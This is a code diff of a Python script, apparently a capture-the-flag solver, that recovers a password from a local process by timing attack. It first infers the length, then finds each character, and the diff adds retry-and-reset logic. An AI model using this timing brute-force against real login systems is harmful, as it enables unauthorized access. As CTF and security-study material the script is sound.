@@ -6,33 +6,63 @@ p = process()
 
 largest = datetime.timedelta()
 pass_len = 0
-for i in range(1, 100):
-    x = b"0" * i
-    t = datetime.datetime.now()
-    p.sendline(x)
-    p.recvline()
-    d = datetime.datetime.now() - t
-    if d > largest:
-        largest = d
-        pass_len = i
+
+
+def get_largest_ms():
+    global largest, pass_len
+    largest = datetime.timedelta()
+    pass_len = 0
+    for i in range(1, 100):
+        x = b"0" * i
+        t = datetime.datetime.now()
+        p.sendline(x)
+        p.recvline()
+        d = datetime.datetime.now() - t
+        if d > largest:
+            largest = d
+            pass_len = i
+
+
+get_largest_ms()
 
 print(f"Largest: {largest.microseconds}ms\nlen: {pass_len}")
 
 known = ""
 unknown = "*" * pass_len
-last_t = None
 i = len(known) + 1
 
+fail_c = 0
+i_changed = False
 while True:
+    # Reset state after 3 failed loops across character set
+    if fail_c >= 3:
+        get_largest_ms()
+        known = ""
+        unknown = "*" * pass_len
+        i = len(known) + 1
+        fail_c = 0
+        i_changed = False
+
     for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_":
         key = known + c + unknown[i:]
-        t = datetime.datetime.now()
-        p.sendline(key)
-        p.recvline()
-        d = datetime.datetime.now() - t
+        try:
+            t = datetime.datetime.now()
+            p.sendline(key)
+            p.recvline()
+            d = datetime.datetime.now() - t
+        except EOFError:
+            exit(0)
         print(f"{key} {d.microseconds} ({d.microseconds / largest.microseconds})")
         if d.microseconds / largest.microseconds > 1.04:
             known += c
             largest = d
             i += 1
+
+            i_changed = True
+            fail_c = 0
             break
+
+    if not i_changed:
+        fail_c += 1
+    else:
+        i_changed = False
